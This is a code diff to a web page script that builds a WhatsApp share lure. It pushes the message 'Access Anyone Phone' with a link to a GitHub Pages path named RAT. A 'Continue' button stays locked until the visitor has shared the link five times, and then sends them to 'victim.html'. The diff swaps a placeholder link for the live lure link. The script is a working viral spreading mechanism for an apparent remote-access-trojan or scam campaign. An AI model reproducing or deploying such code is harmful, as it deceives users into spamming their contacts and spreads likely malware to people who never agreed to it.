@@ -8,19 +8,19 @@ document.addEventListener("DOMContentLoaded", function() {
   let shareCount = 0;
   const requiredShares = 5;
 
-  // Predefined WhatsApp message
-  const shareMessage = encodeURIComponent("Access Anyone Phone.....\nhttps://your-website-link.com");
+  // WhatsApp message
+  const shareMessage = encodeURIComponent(
+    "Access Anyone Phone.....\nhttps://a3organisationa3-ops.github.io/RAT/"
+  );
 
-  // WhatsApp share click
+  // WhatsApp Share Button Click
   shareBtn.addEventListener("click", function() {
-    // Open WhatsApp with pre-filled message
     window.open(`https://wa.me/?text=${shareMessage}`, "_blank");
 
-    // Increase share count
     shareCount++;
     shareCountText.textContent = shareCount;
 
-    // Check if shares reached required number
+    // Unlock continue button
     if (shareCount >= requiredShares) {
       continueBtn.disabled = false;
       continueBtn.classList.remove("btn-locked");
@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   });
 
-  // When continue button is clicked
+  // Continue Button Click
   continueBtn.addEventListener("click", function() {
     if (shareCount >= requiredShares) {
       window.location.href = "victim.html";
